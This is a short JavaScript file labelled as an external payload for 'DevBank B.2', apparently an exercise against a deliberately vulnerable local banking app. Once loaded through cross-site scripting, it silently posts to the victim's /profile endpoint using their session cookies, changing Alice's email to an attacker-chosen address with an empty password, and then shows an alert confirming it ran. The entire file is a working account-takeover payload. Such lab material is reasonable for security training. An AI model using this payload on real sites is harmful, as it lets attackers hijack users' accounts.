(async () => {
    console.log("DevBank B.2 external payload loaded");

    const response = await fetch("/profile", {
        method: "POST",
        credentials: "same-origin",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: new URLSearchParams({
            email: "alice+xss@devbank.local",
            password: ""
        })
    });

    console.log("Profile update response:", response.status);
    alert("DevBank B.2 payload executed - check Alice's profile");
})();
